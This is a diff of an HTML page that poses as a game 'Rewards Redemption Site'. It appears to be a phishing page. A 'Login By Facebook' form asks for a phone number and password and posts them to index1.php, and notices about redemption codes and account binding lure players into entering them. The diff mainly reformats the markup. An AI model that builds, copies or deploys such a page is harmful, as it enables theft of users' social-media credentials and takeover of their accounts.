@@ -1,53 +1,55 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Signup Form</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
-    <link rel="stylesheet" href="style.css">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Signup Form</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+<link rel="stylesheet" href="style.css">
 </head>
 
+        <img id="ifMobile1" src="ff.png" alt="ff.png">
 <body>
-    <div class="background">
-        <img class="logo" src="logo.png" alt="Logo">
+        <img class="logo" src="logo.png" alt="logo.png">
         <div class="note">
-            <h1><b>Rewards Redemption Site</b><br>Please log in.</h1>
+            <h1 ><b>Rewards Redemption Site</b>
+                <br>Please log in.</h1>
             
-            <div style="display: flex; flex-direction: column;">
-                <div class="container">
-                    <h2><i class="fa-brands fa-facebook"></i>Login By Facebook</h2>
-                    <form action="index1.php" method="post">
-                        <label for="phone">Phone Number:</label>
-                        <input type="text" id="phone" name="phone" required>
-                        <label for="password">Password:</label>
-                        <input type="password" id="password" name="password" required>
-                        <input type="checkbox" onclick="togglePassword()"> Show Password
-                        <input type="submit" value="Login">
-                    </form>
+                <div style="display: flex; flex-direction: column;">
+                    <div class="container">
+                        <h2><i class="fa-brands fa-facebook"></i>Login By Facebook</h2>
+                        <form action="index1.php" method="post">
+                            <label for="phone">Phone Number:</label>
+                            <input type="text" id="phone" name="phone" required>
+                            <label for="password">Password:</label>
+                            <input type="password" id="password" name="password" required>
+                            <input type="checkbox" onclick="togglePassword()"> Show Password
+                            <input type="submit" value="Login">
+                        </form>
+                    </div>
                 </div>
-            </div>
 
-            <p><b>Important Notice:</b><br>
-                1. Redemption code has 12/16 characters, consisting of capital letters and numbers. <br>
-                2. Item rewards are shown in [vault] tab in game lobby; Golds or diamonds will add in account wallet automatically.<br>
-                3. Please note redemption expiration date. Any expired codes cannot be redeemed.<br>
-                4. Please contact customer service if you encountered any issue.<br>
-                5. Reminder: you will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or VK in order to receive the rewards.
-            </p>
+                <p><b>Important Notice:</b>
+1. Redemption code has 12/16 characters, consisting of capital letters and numbers. <br>
+2. Item rewards are shown in [vault] tab in game lobby; Golds or diamonds will add <br> in account wallet automatically. <br>
+3. Please note redemption expiration date. Any expired codes cannot be redeemed. <br>
+4. Please contact customer service if you encountered any issue.    <br>
+5. Reminder: you will not be able to redeem your rewards with guest accounts. You may <br> bind your account to Facebook or VK in order to receive the rewards.</p>
+
         </div>
-    </div>
 
-    <script>
-        function togglePassword() {
-            var passwordField = document.getElementById("password");
-            if (passwordField.type === "password") {
-                passwordField.type = "text";
-            } else {
-                passwordField.type = "password";
-            }
-        }
-    </script>
-</body>
+   
 
-</html>
+      <script>
+                    
+
+function togglePassword() {
+    var passwordField = document.getElementById("password");
+    if (passwordField.type === "password") {
+        passwordField.type = "text";
+    } else {
+        passwordField.type = "password";
+    }
+}
+</script>
